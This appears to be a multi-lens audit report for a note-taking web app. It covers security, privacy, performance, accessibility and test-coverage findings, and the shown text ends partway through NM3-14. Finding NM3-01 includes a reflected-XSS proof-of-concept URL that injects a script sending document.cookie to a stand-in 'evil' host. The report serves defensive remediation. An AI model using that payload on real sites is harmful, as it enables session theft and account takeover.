# NoteMage — Full Multi-Lens Audit (2026-06-06)

Read-only audit across 9 voltagent lenses (security, deep pentest, code-review, architecture, compliance, GDPR/CCPA privacy, accessibility, performance, QA/test-coverage), with adversarial verification of every Critical/High finding. Builds on the 2026-05-31 security audit and the 2026-06-06 pentest follow-up (those findings are not re-listed here).

**Method:** each lens ran independently and read-only; each Critical/High candidate was then handed to a skeptic agent instructed to *refute* it against the real code. Severities shown are post-verification. 2 originally-High findings were **refuted** and excluded (see Appendix). Duplicate reports of the same issue across lenses were merged.

## Summary

| Severity | Count |
|---|---:|
| 🟥 Critical | 0 |
| 🟧 High | 2 |
| 🟨 Medium | 28 |
| 🟦 Low | 22 |
| ⬜ Info | 3 |
| **Total (deduped)** | **55** |

63 raw findings → 55 after merging duplicates and dropping 2 refuted. Status column: `open` for all (none fixed yet). Mark with inline `// AUDIT[ID]` in source.

## Remediation status (updated 2026-06-06)

Three fix passes landed the same day. End state: **50 fixed, 2 partial, 3 deferred**. New migrations `20260609000000_audit_indexes_and_auditlog_setnull` and `20260609000001_security_events_and_search_index` (NM3-13/14/19/20/45). Only deferred: NM3-06/28 (write two route tests) and NM3-11 (a fail-closed-vs-fallback behavior decision).

| State | Count | IDs |
|---|---:|---|
| ✅ Fixed | 50 | NM3-01, NM3-02, NM3-04, NM3-05, NM3-07, NM3-08, NM3-09, NM3-10, NM3-12, NM3-13, NM3-14, NM3-15, NM3-16, NM3-17, NM3-18, NM3-19, NM3-20, NM3-21, NM3-22, NM3-23, NM3-24, NM3-25, NM3-26, NM3-27, NM3-29, NM3-30, NM3-31, NM3-32, NM3-33, NM3-34, NM3-35, NM3-36, NM3-37, NM3-39, NM3-40, NM3-41, NM3-42, NM3-43, NM3-44, NM3-45, NM3-46, NM3-47, NM3-48, NM3-49, NM3-50, NM3-51, NM3-52, NM3-53, NM3-54, NM3-55 |
| 🟬 Partial | 2 | NM3-03, NM3-38 |
| ⏸ Deferred | 3 | NM3-06, NM3-11, NM3-28 |

**Deferred buckets:** DB migrations that auto-apply on Coolify (NM3-13/14/18/19/45) · the path-assessment server re-grade (NM3-53, the pentest NEW-1 — client must submit answers) · the performance pass (pagination caps change API/UI contracts; N+1 refactors carry regression risk) · the `/api` auth guard (NM3-30, needs a vetted allowlist) · product/legal call on the age gate (NM3-27) · new infra: security-event log (NM3-20) + data-export endpoint (NM3-42) · missing tests (and the 9 pre-existing suite failures that block making CI blocking).

## Index

| ID | Sev | Lens | Location | Title |
|---|---|---|---|---|
| NM3-01 | 🟧 High | security | `app/api/import/onenote/callback/route.ts:80` | Reflected XSS in OneNote OAuth callback via script-context breakout (error_description) |
| NM3-02 | 🟧 High | compliance, privacy | `app/api/user/delete-account/route.ts:12` | Deleting an account does not cancel an active paid subscription (continued billing after erasure) |
| NM3-03 | 🟨 Medium | qa | `.github/workflows/ci.yml:9` | CI pipeline has no test step — the entire Vitest suite never runs on push or PR |
| NM3-04 | 🟨 Medium | performance | `app/api/community/notebooks/route.ts:44` | community/notebooks GET fetches full user friendship list before every page load to build friend-ID set |
| NM3-05 | 🟨 Medium | performance | `app/api/dashboard/route.ts:89` | dashboard endpoint queries studyPlan.phases in a denormalized aggregation that loads all phase rows |
| NM3-06 | 🟨 Medium | qa | `app/api/groups/[id]/route.ts:28` | No tests for group membership routes — the NM-H9 pending-invitee fix and the broader group authorization surface have no regression guard |
| NM3-07 | 🟨 Medium | security | `app/api/import/classify/route.ts:82` | import/classify uses unscoped 'temp-imports/' storage prefix (reads any user's temp upload) |
| NM3-08 | 🟨 Medium | performance | `app/api/learn/inventory/route.ts:91` | learn/inventory GET queries sections with all pages, then re-sorts in JS using a Map lookup loop |
| NM3-09 | 🟨 Medium | performance | `app/api/notebooks/[id]/flashcard-sets/route.ts:31` | flashcard-sets GET endpoint loads all cards for all sets in a notebook with no pagination |
| NM3-10 | 🟨 Medium | performance | `app/api/notebooks/[id]/pages/[pageId]/generate/route.ts:64` | Sequential checkTokenBudget + checkUsageLimit calls each execute a separate db.user.findUniqueOrThrow |
| NM3-11 | 🟨 Medium | qa | `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:125` | The `code_write` server-side re-execution in the quiz-attempts route silently falls back to client-trusted `passed` when Piston is unconfigured — no test pins this contract and no CI env var ensures Piston is configured |
| NM3-12 | 🟨 Medium | performance | `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:235` | quiz attempts GET endpoint is unbounded — loads all attempts with all answers and all questions |
| NM3-13 | 🟨 Medium | performance | `app/api/notebooks/[id]/study-plans/route.ts:47` | StudyPlan.contextNotebookIds array contains-search has no GIN index |
| NM3-14 | 🟨 Medium | performance | `app/api/search/route.ts:205` | search/route.ts: full text search uses ILIKE without a full-text index on pages.textContent |
| NM3-15 | 🟨 Medium | qa | `app/api/user/activity-heatmap/route.ts:36` | No tests for the cross-user privacy gates on activity-heatmap and achievements routes — NM-H3/H4 fixes are unverified by automated tests |
| NM3-16 | 🟨 Medium | privacy, compliance | `app/api/user/delete-account/route.ts:12` | Account deletion orphans all Supabase Storage files (uploaded PDFs, page/flashcard images, public avatars) — erasure is incomplete |
| NM3-17 | 🟨 Medium | accessibility | `app/waitlist/page.tsx:186` | File input without label or aria-label in waitlist form |
| NM3-18 | 🟨 Medium | privacy | `prisma/schema.prisma:1652` | Registration IP addresses are retained 12 months in `IpRegistration` with no user link and survive account erasure |
| NM3-19 | 🟨 Medium | compliance | `prisma/schema.prisma:1701` | Admin audit log is destroyed when the admin account is deleted (cascade wipes the trail) |
| NM3-20 | 🟨 Medium | compliance | `src/auth/config.ts:184` | No authentication/security event audit log (failed logins, lockouts, OAuth linking, privilege use) |
| NM3-21 | 🟨 Medium | accessibility | `src/components/features/ExamForm.tsx:202` | Form error messages not associated with inputs via aria-describedby |
| NM3-22 | 🟨 Medium | accessibility | `src/components/learn/ChatThread.tsx:1372` | File upload button lacks keyboard accessibility and semantic role |
| NM3-23 | 🟨 Medium | accessibility | `src/components/learn/ChatThread.tsx:1754` | Video thumbnail image has empty alt text |
| NM3-24 | 🟨 Medium | accessibility | `src/components/pricing/FeatureComparison.tsx:238` | Pricing table headers lack scope attributes |
| NM3-25 | 🟨 Medium | accessibility | `src/components/ui/MarkdownRenderer.tsx:259` | Table headers missing scope attribute |
| NM3-26 | 🟨 Medium | performance | `src/lib/achievement-checker.ts:21` | gatherUserStats issues 14+ parallel DB queries on every achievement check call |
| NM3-27 | 🟨 Medium | privacy, compliance | `src/lib/age.ts:8` | Minimum-age gate is 13 while the Privacy Policy targets a 16+ digital-consent age, with no parental-consent path for 13-15 |
| NM3-28 | 🟨 Medium | qa | `src/lib/lemonsqueezy.ts:179` | The billing-sync ownership-verification path (`syncOwnerMatchesCaller`) is untested — no test covers the forgery-rejection or the fallback customer-id path |
| NM3-29 | 🟨 Medium | qa | `src/lib/quiz-grading.test.ts:8` | quiz-grading.test.ts covers only the `equation` kind — 10 of 11 grading branches are untested, including the security-sensitive `code_write` pass-through |
| NM3-30 | 🟨 Medium | architecture | `src/middleware.ts:147` | No /api/* authentication or defense-in-depth layer — every API route's authz is a single load-bearing handler check |
| NM3-31 | 🟦 Low | compliance | `app/api/admin/users/route.ts:33` | Admin reads of bulk user PII (emails) are not audit-logged |
| NM3-32 | 🟦 Low | qa | `app/api/billing/lemonsqueezy/webhook/route.ts:48` | Zero automated tests for billing webhook routes — payment provisioning correctness and HMAC signature verification have no regression coverage |
| NM3-33 | 🟦 Low | performance | `app/api/dashboard/route.ts:64` | dashboard Page.count queries traverse a nested join chain (section -> notebook -> userId) with no index |
| NM3-34 | 🟦 Low | code-review | `app/api/groups/[id]/shared/[sharedId]/csv/route.ts:63` | CSV formula injection in group flashcard-set CSV export |
| NM3-35 | 🟦 Low | code-review | `app/api/import/classify/route.ts:106` | Multi-PDF import 'classify' makes a paid Gemini call but never records token usage (quota under-count) |
| NM3-36 | 🟦 Low | security | `app/api/learn/chats/[chatId]/messages/route.ts:67` | AI chat message endpoint rate-limited only by spoofable client IP (no per-user limiter) |
| NM3-37 | 🟦 Low | performance | `app/api/learn/chats/route.ts:21` | learn/chats GET has no pagination — loads all user chats with message count in one query |
| NM3-38 | 🟦 Low | pentest-deep | `app/api/learn/paths/route.ts:105` | Concurrency quota bypass (TOCTOU) on AI path generation: check-then-act between checkUsageLimit and incrementUsage |
| NM3-39 | 🟦 Low | performance | `app/api/notebooks/[id]/chats/route.ts:25` | notebooks/[id]/chats GET has no pagination — loads all chats with their associated flashcard/quiz sets |
| NM3-40 | 🟦 Low | pentest-deep | `app/api/notebooks/[id]/flashcard-sets/[setId]/flashcards/[cardId]/images/route.ts:76` | Cross-tenant flashcard-image read via unscoped storagePath in image-registration route |
| NM3-41 | 🟦 Low | architecture, code-review, security | `app/api/uploads/signed-url/route.ts:178` | Group-avatar upload token issued with no group-membership authorization (object-level authz gap on the signed-URL boundary) |
| NM3-42 | 🟦 Low | privacy, compliance | `app/api/user/delete-account/route.ts:6` | No self-serve data-access / portability export endpoint — DSARs are manual-email only |
| NM3-43 | 🟦 Low | performance | `app/api/user/todos/route.ts:20` | Todos and Exams list endpoints have no pagination limit |
| NM3-44 | 🟦 Low | accessibility | `app/globals.css:1` | Missing screen reader only utility class |
| NM3-45 | 🟦 Low | performance | `prisma/schema.prisma:426` | Missing compound index on ChatMessage (userId, createdAt) for hot token-budget aggregation query |
| NM3-46 | 🟦 Low | privacy | `sentry.client.config.ts:3` | Sentry initialised with default PII capture and no scrubbing / no consent gate |
| NM3-47 | 🟦 Low | accessibility | `src/components/learn/ChatThread.tsx:1360` | File input without visible label or aria-label |
| NM3-48 | 🟦 Low | performance | `src/lib/achievement-checker.ts:210` | N+1 query in gatherUserStats: per-attempt DB round-trip for perfect-first-try achievement |
| NM3-49 | 🟦 Low | privacy | `src/lib/microsoftAuth.ts:251` | OneNote disconnect and account deletion do not revoke the OAuth grant at Microsoft (only delete the local encrypted token) |
| NM3-50 | 🟦 Low | qa | `src/lib/path-gating.ts:202` | The `starsForPercentage` and `isSlotUnlocked` functions — which gate assessment pass/fail and slot accessibility — have no direct unit tests |
| NM3-51 | 🟦 Low | performance | `src/lib/path-loader.ts:83` | loadPathsForUser fetches full phase/slot/activity tree for every path with no pagination |
| NM3-52 | 🟦 Low | performance | `src/lib/usage-limits.ts:109` | getUserUsageSummary issues a DB round-trip per lifetime-limited feature inside Promise.all |
| NM3-53 | ⬜ Info | qa | `app/api/learn/slots/[slotId]/assessment/route.ts:34` | No test for the assessment route — client-trusted score/total forgery (the exact prior-pentest finding) has no regression guard |
| NM3-54 | ⬜ Info | architecture | `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:121` | Two divergent grading trust boundaries — server re-grades notebook quizzes but trusts the client for learn-path assessment slots |
| NM3-55 | ⬜ Info | privacy | `src/components/analytics/PostHogIdentify.tsx:18` | PostHog identify transmits email and full name to the analytics processor |

---

## Findings

## 🟧 High

### NM3-01 — Reflected XSS in OneNote OAuth callback via script-context breakout (error_description)

- **Severity:** High
- **Lens:** security
- **Category:** OWASP A03:2021 - Injection (Cross-Site Scripting)
- **Location:** `app/api/import/onenote/callback/route.ts:80`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The callback is a public, unauthenticated GET endpoint. The `error`/`error_description` query params are attacker-controlled and reflected into an inline <script> via `${JSON.stringify(message)}`. JSON.stringify escapes quotes/backslashes but NOT the literal sequence `</script>`, so a victim who opens https://notemage.app/api/import/onenote/callback?error=x&error_description=</script><script>fetch('//evil/?c='+document.cookie)</script> will have the injected markup parsed as HTML (the inline script terminates early at the reflected </script>) and the attacker's script runs on the notemage.app origin. CSP is Content-Security-Policy-Report-Only (no script-src enforcement), so it does not block this. The error branch runs BEFORE state/HMAC verification, so no valid OAuth state is needed. Result: arbitrary JS in the app origin — session/cookie theft, CSRF-token theft, account takeover actions. The route is live even though the OneNote UI button is hidden behind ONENOTE_IMPORT_ENABLED=false (flag only hides the client button; the API route is deployed and reachable).

**Evidence**

```
const message = errorDescription || error;  ... return new NextResponse(buildCallbackHtml('error', message), ...)  // buildCallbackHtml emits:
  window.opener.postMessage({ type: 'onenote-auth-${type}', message: ${JSON.stringify(message)} }, window.location.origin);
// escapeHtml() is applied in the <p> body but NOT to the JSON.stringify(message) inside <script>; JSON.stringify does not neutralize </script>
```

**Remediation**

Do not interpolate attacker-controlled strings into an inline <script>. Either (a) move `message` into a data-* attribute / element textContent and read it from JS, or (b) JSON-encode with the </script>-safe escaping (replace `<` with `<`) before embedding, e.g. JSON.stringify(message).replace(/</g,'\\u003c'). Additionally flip CSP from Report-Only to enforcing with a real script-src (drop 'unsafe-inline' via nonces) so a future reflection can't execute.

---

### NM3-02 — Deleting an account does not cancel an active paid subscription (continued billing after erasure)

- **Severity:** High
- **Lens:** compliance, privacy *(reported by 2 lenses)*
- **Category:** Consumer Protection / PCI-DSS-adjacent Billing Lifecycle
- **Location:** `app/api/user/delete-account/route.ts:12`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The cancel-tier route (apps/web/app/api/user/tier/route.ts:65) correctly calls `cancelLemonSqueezySubscription` to stop billing, but the account-deletion handler does not. A PRO user who deletes their account while subscribed has the `User` row (and `lemonSqueezySubscriptionId`) destroyed, yet the recurring subscription at Lemon Squeezy keeps charging their card on each renewal with no remaining account to manage or cancel it. The subsequent `subscription_*` webhook can no longer resolve the user (apps/web/app/api/billing/lemonsqueezy/webhook/route.ts:121 returns early), so the charge silently continues. This is direct financial harm and an EU consumer-protection/SCA-mandate failure.

**Evidence**

```
await db.user.delete({ where: { id: userId } });   // lemonSqueezySubscriptionId destroyed; cancelLemonSqueezySubscription() never called
```

**Remediation**

In both deletion handlers, before deleting the user, read `entitlementSource`/`lemonSqueezySubscriptionId` and call `cancelLemonSqueezySubscription` (and, for Apple, surface that App Store subs must be cancelled by the user). Only delete after the cancel succeeds, or record a pending-cancel job to retry.

---

## 🟨 Medium

### NM3-03 — CI pipeline has no test step — the entire Vitest suite never runs on push or PR

- **Severity:** Medium *(verifier adjusted from High)*
- **Lens:** qa
- **Category:** Process / CI-CD Quality Gate
- **Location:** `.github/workflows/ci.yml:9` *(verifier-corrected from .github/workflows/ci.yml:1)*
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** 🟬 PARTIAL — advisory `vitest run` now runs in CI; make it blocking once the 9 pre-existing suite failures are fixed.

**Impact / attack scenario**

Every automated test in the repo (api-auth-coverage, safe-math, quiz-grading, billing-coverage, moderation, pdf-import, usage-limits, path-gating, etc.) is dead code from a CI perspective. A PR that breaks the safe-math sandbox, the grading logic, the path-gating unlock contract, or the auth coverage invariant will be merged without any automated signal. This means the entire test investment — including the security regression tests added post-audit — provides zero protection against future regressions unless a developer runs `pnpm test` locally. The two CI jobs that DO exist only run lint (changed-files only), typecheck, and a Next.js build.

**Evidence**

```
The `ci.yml` workflow defines two jobs: `lint-and-typecheck` (runs eslint, tsc, prettier) and `build` (runs next build). Neither job contains `pnpm --filter web test`, `vitest run`, or any equivalent step. `grep -c 'pnpm.*test|vitest run' .github/workflows/ci.yml` returns 0.
```

**Remediation**

Add a third job `test` that runs after `lint-and-typecheck`: `pnpm --filter web test`. It needs only the same env stubs as the build job (DATABASE_URL, NEXTAUTH_SECRET, UPSTASH_* fakes). The vitest environment is `node` with no DB calls (all DB interactions are mocked), so no real Supabase/Postgres is needed. This is a 6-line addition to the YAML.

---

### NM3-04 — community/notebooks GET fetches full user friendship list before every page load to build friend-ID set

- **Severity:** Medium
- **Lens:** performance
- **Category:** Redundant Query / Missing Caching
- **Location:** `app/api/community/notebooks/route.ts:44`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

For the 'all' filter (the default), the endpoint performs a full db.friendship.findMany with no LIMIT on the user's friendships to build a friendIds array, then passes it as IN filter to the SharedNotebook query. A user with 100+ friends issues a full friendship table scan (no take limit) on every community library page load. The same pattern exists in the search endpoint (lines 124-133) and is called by the search bar on every keystroke. The Friendship model has only @@index([addresseeId]) — not a compound (requesterId/addresseeId, status) index suited for this query pattern.

**Evidence**

```
const friendships = await db.friendship.findMany({
  where: {
    status: 'accepted',
    OR: [{ requesterId: userId }, { addresseeId: userId }],
  },
  select: { requesterId: true, addresseeId: true },
});
const friendIds = friendships.map(...);
```

**Remediation**

1. Add @@index([requesterId, status]) to Friendship (complements the existing addresseeId index). 2. Cap the friendship fetch: take: 1000 (no user legitimately has more friends than this in an early-stage app, and it bounds the IN clause size). 3. Consider caching the friendId list in Redis with a short TTL (60s) keyed by userId, since it changes rarely and is read on every community browse and search.

---

### NM3-05 — dashboard endpoint queries studyPlan.phases in a denormalized aggregation that loads all phase rows

- **Severity:** Medium
- **Lens:** performance
- **Category:** Inefficient Query
- **Location:** `app/api/dashboard/route.ts:89`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The dashboard GET fetches every StudyPlan for the user plus all their phases (with status and updatedAt) to compute weekPlansCompleted in JavaScript. A user with 20 plans each having 6 phases = 120 StudyPhase rows loaded to compute a single dashboard counter. This runs on every dashboard page load. The filter logic (all phases completed, lastUpdated >= weekStart) is trivially expressible as a WHERE clause in SQL but is done in JavaScript after loading all rows.

**Evidence**

```
db.studyPlan.findMany({
  where: {
    notebook: { userId },
    createdAt: { lte: new Date() },
    phases: { some: {} },
  },
  select: {
    id: true,
    phases: { select: { status: true, updatedAt: true } },
  },
})
// Then in JS:
const weekPlansCompleted = weekPlans.filter((plan) => {
  if (!plan.phases.every((phase) => phase.status === 'completed')) return false;
  ...
```

**Remediation**

Replace with a raw SQL count or Prisma nested WHERE: db.studyPlan.count({ where: { userId, phases: { every: { status: 'completed', updatedAt: { gte: weekStart } } } } }). This pushes the filter to the DB and returns a single integer instead of loading all phase rows. Note: Prisma's every+some with date conditions may require a raw query for precision; a raw COUNT(DISTINCT plan_id) is a one-liner.

---

### NM3-06 — No tests for group membership routes — the NM-H9 pending-invitee fix and the broader group authorization surface have no regression guard

- **Severity:** Medium
- **Lens:** qa
- **Category:** Test Coverage / Authorization
- **Location:** `app/api/groups/[id]/route.ts:28`
- **Confidence:** high
- **Status:** open

**Impact / attack scenario**

The prior audit found NM-H9 (pending invitees treated as full members). The fix (`membership.status !== 'accepted'`) is present in `groups/[id]/route.ts`, `groups/[id]/notebooks/route.ts`, and `groups/[id]/messages/route.ts`. There are zero automated tests for any group route. A regression that removes the `status !== 'accepted'` check — e.g. during a refactor that introduces a helper function — would not be caught. Additionally the `role` demotion bug (NM-M10, teacher can demote the owner) is present in the `role` route with no test verifying the fix, and the group transfer route (`groups/[id]/transfer/route.ts`) has no test coverage.

**Evidence**

```
`find apps/web/src -name '*.test.ts' | xargs grep -l 'groups|invit|pending.*member|membership.*status'` returns no output. The entire `app/api/groups/` subtree (10 route files) has no corresponding test files in `src/__tests__/api/`.
```

**Remediation**

Add tests for the highest-risk group routes: `groups/[id]/route.ts` — pending invitee (status=pending) should get 403 from GET; `groups/[id]/role/route.ts` — teacher attempting to demote the owner should return 403; `groups/[id]/notebooks/route.ts` — pending invitee should get 403 on POST and DELETE. These can all be written as unit tests importing the route handlers directly with mocked db responses.

---

### NM3-07 — import/classify uses unscoped 'temp-imports/' storage prefix (reads any user's temp upload)

- **Severity:** Medium
- **Lens:** security
- **Category:** OWASP A01:2021 - Broken Access Control (IDOR)
- **Location:** `app/api/import/classify/route.ts:82`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

validateStoragePath(pdfPath, 'temp-imports/') only checks the top-level prefix, not 'temp-imports/<userId>/'. The download uses the service-role Supabase client (bypasses RLS), so an authenticated user can pass another tenant's path (temp-imports/<victimUserId>/<ts>-<file>) and the route will download and sample its text. The sampled text is sent to Gemini for subject grouping; the proposed `groups` returned to the caller echo the group `name`/`subject` (derived from the sampled content) and the caller-supplied paths, leaking coarse content/subject signal about another user's uploaded PDF. Paths under temp-imports/<userId>/<ts>-<rand> are hard to guess, so this is harder to exploit than the documents/<notebookId> case — but it is the same unscoped-prefix class as the sibling import-xlsx/import-pptx/flashcard-sets-import routes (and import/commit already scopes correctly to `temp-imports/${userId}/`).

**Evidence**

```
if (typeof pdfPath !== 'string' || !validateStoragePath(pdfPath, 'temp-imports/')) { return badRequestResponse('Invalid file path.'); }  ... const buffer = await downloadFromStorage(files[i].pdfPath);
```

**Remediation**

Scope the prefix to the caller: validateStoragePath(pdfPath, `temp-imports/${userId}/`), exactly as import/commit does. Apply the same fix across the unscoped 'temp-imports/' call sites (import-xlsx, import-pptx, flashcard-sets/import) so the service-role download is bounded to the caller's own temp prefix.

---

### NM3-08 — learn/inventory GET queries sections with all pages, then re-sorts in JS using a Map lookup loop

- **Severity:** Medium
- **Lens:** performance
- **Category:** Inefficient In-Memory Processing
- **Location:** `app/api/learn/inventory/route.ts:91`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The endpoint first fetches all notebooks, sections (with pages), flashcard sets, quiz sets, and documents in parallel for all the user's notebooks (no limit). It then re-sorts flashcardSets, quizSets, documents, and pages in JavaScript using a comparator that calls orderIndex.get() per element — this is O(N log N) in JS after the DB already returned data ordered by notebookId. Additionally, the annotate() function calls notebooks.find() (O(N) linear scan over the notebooks array) for every single item being annotated — O(items × notebooks). For a user with 50 notebooks and 500 items this is 25,000 linear scan steps.

**Evidence**

```
const sortByNotebook = <T extends { notebookId: string | null }>(items: T[]) =>
  items.slice().sort((a, b) => {
    const ai = a.notebookId ? orderIndex.get(a.notebookId) ?? 0 : 0;
    ...
  });

const annotate = <T>(notebookId: string | null) => {
  const nb = notebookId
    ? notebooks.find((n) => n.id === notebookId) ?? null  // O(N) per call
    : null;
  ...
```

**Remediation**

Replace notebooks.find() with a Map lookup (already have orderIndex as a Map; add a notebookById Map). The DB queries for sections/flashcards/quizzes/documents already ORDER BY notebookId — push the sort into the DB ORDER BY clause and eliminate the JS re-sort entirely. Add pagination: a user with 100+ notebooks and thousands of items should never get everything in one shot.

---

### NM3-09 — flashcard-sets GET endpoint loads all cards for all sets in a notebook with no pagination

- **Severity:** Medium
- **Lens:** performance
- **Category:** Unbounded Query / Over-fetching
- **Location:** `app/api/notebooks/[id]/flashcard-sets/route.ts:31`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

GET /api/notebooks/[id]/flashcard-sets includes all flashcards for all sets in the notebook. A heavy user may have 10 sets of 200 cards each = 2,000 flashcard rows loaded to render a notebook's sidebar flashcard list. This endpoint is called on every notebook open. The response payload and memory usage grow O(sets × cards_per_set) with no upper bound. The API also has a 20,000 card-per-set limit in POST, meaning a single set could push 20,000 rows through this response.

**Evidence**

```
const sets = await db.flashcardSet.findMany({
  where: { notebookId, sourcePathId: null },
  include: {
    _count: { select: { flashcards: true } },
    flashcards: { orderBy: { sortOrder: 'asc' } },
  },
  orderBy: { updatedAt: 'desc' },
});
```

**Remediation**

For the list endpoint, use select: { id, title, _count, updatedAt } instead of including full flashcard data. Return flashcard rows only in the detail endpoint GET /api/notebooks/[id]/flashcard-sets/[setId], which is already loaded when a user opens a specific set. This change reduces the list payload by 99% for users with large card sets.

---

### NM3-10 — Sequential checkTokenBudget + checkUsageLimit calls each execute a separate db.user.findUniqueOrThrow

- **Severity:** Medium
- **Lens:** performance
- **Category:** Redundant Database Queries
- **Location:** `app/api/notebooks/[id]/pages/[pageId]/generate/route.ts:64`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

In page/generate, ai-inline, chat messages (both notebook and learn routes), path creation, and path regenerate: checkTokenBudget first fetches the user (tier, role), then checkUsageLimit also fetches the user (tier, role) separately — two sequential db.user.findUniqueOrThrow calls per request on every AI endpoint. Each is a round-trip to the DB. On the chat message path these happen before every AI call, which is the application's hottest per-user endpoint.

**Evidence**

```
// token-budget.ts:16
const user = await db.user.findUniqueOrThrow({ where: { id: userId }, select: { tier, role } });
// usage-limits.ts:15
const user = await db.user.findUniqueOrThrow({ where: { id: userId }, select: { tier, role } });

// Called sequentially in page/generate/route.ts:
const { allowed: tokenAllowed } = await checkTokenBudget(userId);
...
const usage = await checkUsageLimit(userId, usageFeature);
```

**Remediation**

Create a combined checkAiGates(userId, feature) function that fetches the user once and calls both checks in a single DB round-trip, or pass the user record as a parameter into both functions. On the chat and generate paths this saves one DB query per request.

---

### NM3-11 — The `code_write` server-side re-execution in the quiz-attempts route silently falls back to client-trusted `passed` when Piston is unconfigured — no test pins this contract and no CI env var ensures Piston is configured

- **Severity:** Medium
- **Lens:** qa
- **Category:** Test Coverage / Grading Security
- **Location:** `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:125`
- **Confidence:** high
- **Status:** open

**Impact / attack scenario**

Lines 125-156 of the attempts route re-execute `code_write` answers server-side against declared test cases only when `isPistonConfigured()` is true (`PISTON_URL` env var is set). When Piston is absent — which is the default state since `PISTON_URL` is not in `.env.example` and not in the CI `env:` block — the grading falls back to whatever `userAnswer.passed` the client sent. A comment on line 123 acknowledges this: 'If Piston is unavailable, keep the submitted value'. If production ever loses `PISTON_URL` (a Coolify env var deletion or service outage), all `code_write` submissions silently revert to client-trusted grades with no alert. There is no test for the `isPistonConfigured() === false` path in the attempts route, no test for the Piston-configured path, and no CI alert if `PISTON_URL` is missing.

**Evidence**

```
Line 125: `if (isPistonConfigured()) {` — the entire server-side re-execution block is inside this conditional. `PISTON_URL` does not appear in `apps/web/.env.example` (verified by `grep -c 'PISTON_URL' .env.example` → 0). The CI `env:` block in `ci.yml` does not set `PISTON_URL`. `isPistonConfigured()` at `src/lib/piston-client.ts:119` returns `pistonBaseUrl() !== null`, and `pistonBaseUrl()` returns `null` when `PISTON_URL` is unset.
```

**Remediation**

(1) Add `PISTON_URL` to `.env.example` with a comment that explains the fallback behavior when absent. (2) Write a test for the attempts route's `code_write` grading that explicitly covers the `isPistonConfigured()=false` branch (assert client-supplied `passed` is used) and the `isPistonConfigured()=true` branch (assert server re-execution overrides client). (3) Add a startup warning log or a health-check metric when `PISTON_URL` is absent and `code_write` questions exist. (4) Consider making the fail-open behavior configurable — a `CODE_WRITE_REQUIRE_PISTON=true` flag that rejects `code_write` submissions when Piston is down rather than trusting the client.

---

### NM3-12 — quiz attempts GET endpoint is unbounded — loads all attempts with all answers and all questions

- **Severity:** Medium
- **Lens:** performance
- **Category:** Unbounded Query
- **Location:** `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:235`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

GET /api/notebooks/[id]/quiz-sets/[setId]/attempts loads every attempt a user has made on a quiz set, with all QuizAnswer rows (one per question per attempt) each including the full QuizQuestion. A user who has done 50 attempts on a 20-question quiz has 1,000 answer rows + 1,000 question JOIN rows loaded into memory and serialized. No pagination or limit is applied. This is the history view endpoint but is unbounded.

**Evidence**

```
const attempts = await db.quizAttempt.findMany({
  where: { quizSetId: setId, userId },
  orderBy: { createdAt: 'desc' },
  include: {
    answers: {
      include: {
        question: { select: { id, kind, payload, question, options, correctIndex } }
      }
    }
  },
}); // No take: or limit
```

**Remediation**

Add take: 20 with cursor-based pagination. The history view only shows recent attempts; loading all history upfront is unnecessary. The quiz question data is static and could be fetched separately (once) rather than included in every attempt row.

---

### NM3-13 — StudyPlan.contextNotebookIds array contains-search has no GIN index

- **Severity:** Medium
- **Lens:** performance
- **Category:** Missing Database Index
- **Location:** `app/api/notebooks/[id]/study-plans/route.ts:47`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06) — GIN index added; migration `20260609000000_audit_indexes_and_auditlog_setnull`.

**Impact / attack scenario**

GET /api/notebooks/[id]/study-plans queries studyPlan WHERE userId = $1 AND (notebookId = $2 OR contextNotebookIds @> ARRAY[$2]). The @> (array contains) operator on contextNotebookIds (a String[] column) cannot use the @@index([userId]) B-tree index for the array predicate; PostgreSQL will scan all the user's study plans to evaluate the array condition. For a power user with 50+ paths this is a full scan on every notebook open. StudyPlan has no GIN index on contextNotebookIds.

**Evidence**

```
const plans = await db.studyPlan.findMany({
  where: {
    userId,
    OR: [
      { notebookId },
      { contextNotebookIds: { has: notebookId } },
    ],
  },
  ...
});
// schema.prisma StudyPlan:
@@index([userId])
@@index([notebookId])
// No GIN index on contextNotebookIds
```

**Remediation**

Add a GIN index via a raw migration: CREATE INDEX study_plans_context_nb_gin ON study_plans USING gin(context_notebook_ids). Prisma does not expose GIN index creation natively for array fields, so use a raw SQL migration. Alternatively, normalize the many-to-many relationship into a separate StudyPlanNotebook join table with a standard B-tree index.

---

### NM3-14 — search/route.ts: full text search uses ILIKE without a full-text index on pages.textContent

- **Severity:** Medium
- **Lens:** performance
- **Category:** Missing Database Index / Full Table Scan
- **Location:** `app/api/search/route.ts:205`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

The page content search uses { textContent: { contains: query, mode: 'insensitive' } } (Postgres ILIKE '%query%') with only an @@index([sectionId]) on the pages table. The sectionId index does not help the ILIKE predicate. Prisma translates this to a full table scan filtered by a nested join through sections to notebooks. A user with 500 pages triggers a sequential scan over all 500 rows' textContent columns on every search keystroke (rate-limited to 30/min per user, but still O(pages) per search). The Page model has no full-text search (tsvector) index.

**Evidence**

```
const pages = await db.page.findMany({
  where: {
    textContent: { contains: query, mode: 'insensitive' },
    section: { notebook: { userId } },
  },
  ...
  take: context === 'workspace' ? 20 : 10,
});

// Page model in schema.prisma:
@@index([sectionId])
@@map("pages")  // No textContent index
```

**Remediation**

